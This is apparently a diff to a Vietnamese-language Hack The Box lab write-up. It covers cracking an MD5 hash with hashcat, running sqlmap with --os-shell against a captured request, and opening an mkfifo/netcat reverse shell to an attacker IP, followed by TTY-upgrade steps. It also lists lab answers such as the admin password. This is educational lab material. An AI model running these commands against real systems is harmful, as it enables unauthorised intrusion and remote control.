@@ -39,5 +39,28 @@
 - Chạy không ra => dùng hashcat 
 - hashcat -m 0 -a 0 vaccine2.txt /usr/share/wordlists/rockyou.txt
 - trong đó -m là hash mode 0 là md5, -a attack mode  0 | Straight
+![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/389030fd-416c-4c61-a0bc-badc488057f9)
+
 - Task 5: What is the password for the admin user on the website?: qwerty789
+- Đề bài ở đây là thực thi sql injection: sử dụng sql map.
+- Tạo 1 file là new.req để lưu request.
+- Dùng burpsuite bắt requets copy-> new.req
+- ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/37a107c6-cce8-4340-8167-fcec10e9dc59)
+
+- Sử dụng sqlmap -r new.req --os-shell
+- Tham số -r là đọc request từ file new.req, tham số --os-shell để thực thi lệnh shell từ xa. 
 - Task 6: What option can be passed to sqlmap to try to get command execution via the sql injection?: --os-shell
+- ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/c4679cf5-719d-4233-920c-2e0217587f6e)
+
+- lệnh shell: (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.22 1234 >/tmp/f)
++ Sẽ tạo tệp fifo: tệp để truyền dữ liệu giữa các tiến trình: ip 10.10.14.22(ip của máy tấn công: ifconfig, tun0) cổng 1234 
++ Sau khi thực thi lệnh xong.
++ mở terminal chạy netcat để lắng nghe trên cổng 1234 
++ để shell hoạt động trơn tru vip pro hơn: 
+      python3 -c 'import pty;pty.spawn("/bin/bash")'
+      CTRL+Z
+      stty raw -echo
+      fg
+      export TERM=xterm
+![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/4691fbcf-a4c7-412e-a7ce-77da3fb87460)
+
